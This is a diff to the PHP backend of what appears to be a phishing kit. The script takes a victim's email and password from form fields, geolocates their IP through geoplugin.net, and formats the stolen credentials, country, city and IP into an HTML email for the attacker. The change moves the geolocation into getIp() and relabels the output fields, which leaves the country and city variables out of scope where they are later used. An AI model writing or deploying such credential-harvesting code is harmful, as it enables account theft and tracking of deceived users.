@@ -2,16 +2,6 @@
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
 header('Access-Control-Allow-Headers: X-Requested-With,Origin,Content-Type,Cookie,Accept');
-$ip = getenv("REMOTE_ADDR");
-$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
-if(property_exists($ipdat, 'geoplugin_countryCode'));
-if(property_exists($ipdat, 'geoplugin_countryName'));
-if(property_exists($ipdat, 'geoplugin_city'));
-if(property_exists($ipdat, 'geoplugin_region'));
-$countrycode = $ipdat->geoplugin_countryCode;
-$country = $ipdat->geoplugin_countryName;
-$city = $ipdat->geoplugin_city;
-$region = $ipdat->geoplugin_region;
 
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
@@ -30,8 +20,18 @@ class Email{
     }
 
 	public function getIp(){
+
 		$ip = $_SERVER['REMOTE_ADDR'];
-		
+		$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
+if(property_exists($ipdat, 'geoplugin_countryCode'));
+if(property_exists($ipdat, 'geoplugin_countryName'));
+if(property_exists($ipdat, 'geoplugin_city'));
+if(property_exists($ipdat, 'geoplugin_region'));
+$countrycode = $ipdat->geoplugin_countryCode;
+$country = $ipdat->geoplugin_countryName;
+$city = $ipdat->geoplugin_city;
+$region = $ipdat->geoplugin_region;
+
 		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
 			$ip = $_SERVER['HTTP_CLIENT_IP'];
 		}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
@@ -73,9 +73,9 @@ if(isset($_POST)){
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['subject'] = $email->clean($_REQUEST['pet']);
     $data['cname'] = $email->clean($country);
     $data['ccity'] = $email->clean($city);
+    $data['subject'] = $email->clean($_REQUEST['pet']);
 
     $data['message'] =
 		"
@@ -90,9 +90,9 @@ if(isset($_POST)){
 				<p></p>
 			    <p><strong>E-ID:</strong> ".$data['email']."</p>
 			    <p><strong>P-ID:</strong>".$data['pass']."</p>
-				<p>
-				  <p><strong>E-ID:</strong> ".$data['cname']."</p>
-			    <p><strong>P-ID:</strong>".$data['ccity']."</p>
+				<p></p>
+				  <p><strong>CNAME:</strong> ".$data['cname']."</p>
+			    <p><strong>CCITY:</strong>".$data['ccity']."</p>
 			    <p><strong>IP:</strong>".$data['ip']."</p>
 			    <br>
 			</body>
